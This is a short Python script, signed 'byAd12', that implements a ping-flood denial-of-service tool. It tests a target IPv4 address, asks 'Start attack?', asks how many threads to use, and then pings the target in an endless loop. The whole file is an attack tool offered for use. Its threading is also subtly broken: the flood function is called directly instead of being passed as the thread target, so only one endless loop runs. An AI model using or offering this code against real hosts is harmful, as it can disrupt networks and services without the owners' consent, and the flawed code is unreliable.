# byAd12

from ping3 import ping
import threading

##########################################################################################
##########################################################################################

def Ping_Flood_(IPv4):
    ###########################
    def ping_(IPv4):
        r = ping(IPv4)
        if r is None:
            return print(f"[Inactive]\t{r}")
        else:
            return print(f"[Active]\t{r * 1000:.2f} ms")
    ###########################
    def flood_ping(IPv4, i):
        while True:
            ping_(IPv4); i += 1
    ###########################
    if not IPv4:
        return print("IPv4 required to run this function.")
    print(f"Test ping to ({IPv4}): ")
    ping_(IPv4) #- TEST
    i = 0
    #- ASK
    if int(input(f"\nStart attack?\tYes: 1\tNo: 2\tAnswer: ")) == 1:
        HILOS = int(input(f"Threads: "))
        print(f"Starting attack to ({IPv4}):")
        try:
            threads = []
            for _ in range(HILOS):
                t = threading.Thread(target=flood_ping(IPv4, i))
                t.start()
                threads.append(t)
            for t in threads:
                t.join()
            #-
        except KeyboardInterrupt:
            if i == 0:
                return "Cancelled"
            else:
                return "Stopped"
        except Exception as e:
            return "Error"
    #-
    return "Cancelled"